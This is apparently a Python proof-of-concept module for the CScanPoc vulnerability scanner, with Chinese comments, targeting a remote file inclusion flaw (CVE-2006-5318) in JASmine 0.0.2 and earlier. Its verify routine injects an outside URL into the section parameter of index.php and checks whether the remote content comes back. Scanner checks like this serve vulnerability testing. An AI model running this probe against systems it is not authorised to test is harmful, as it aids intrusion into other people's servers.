# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'JASmine_0000'  # 平台漏洞编号
    # 漏洞名称
    name = 'JASmine <= 0.0.2 (index.php) Remote File Include Vulnerability'
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2006-10-17'  # 漏洞公布时间
    desc = '''
        Nayco JASmine(又称为Jasmine-Web)的index.php脚本存在PHP远程文件包含漏洞，远程攻击者可借助section参数中的FTP URL执行任意PHP代码。
        JASmine <= 0.0.2版本中的index.php文件存在远程代码执行漏洞。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-7871'
    cnvd_id = 'CNVD-2006-7871'  # cnvd漏洞编号
    cve_id = 'CVE-2006-5318'  # cve编号
    product = 'JASmine'  # 漏洞组件名称
    product_version = '<= 0.0.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a579ce98-8305-4da4-9728-5b9d99cfb58d'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/index.php?section=http://baidu.com/robots.txt'
            response = requests.get(vul_url).text
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
